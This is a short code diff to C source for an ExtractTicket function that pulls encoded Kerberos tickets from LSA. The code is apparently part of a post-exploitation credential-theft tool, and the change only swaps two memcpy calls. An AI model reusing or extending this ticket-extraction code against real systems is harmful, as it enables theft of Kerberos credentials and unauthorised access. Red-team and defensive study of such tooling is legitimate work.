@@ -111,7 +111,7 @@ NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING
     retrieveRequest->EncryptionType = 0;
     retrieveRequest->TargetName = targetName;
     retrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)retrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
-    MSVCRT$memcpy(retrieveRequest->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength);
+    _memcpy(retrieveRequest->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength);
 
     NTSTATUS protocolStatus;
     NTSTATUS status = STATUS_SUCCESS;
@@ -124,7 +124,7 @@ NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING
                 ULONG size = retrieveResponse->Ticket.EncodedTicketSize;
                 PUCHAR returnTicket = (PUCHAR)MSVCRT$calloc(size, sizeof(UCHAR));
                 if (returnTicket != NULL) {
-                    MSVCRT$memcpy(returnTicket, retrieveResponse->Ticket.EncodedTicket, size);
+                    _memcpy(returnTicket, retrieveResponse->Ticket.EncodedTicket, size);
                     *ticket = returnTicket;
                     *ticketSize = size;
                 } else {
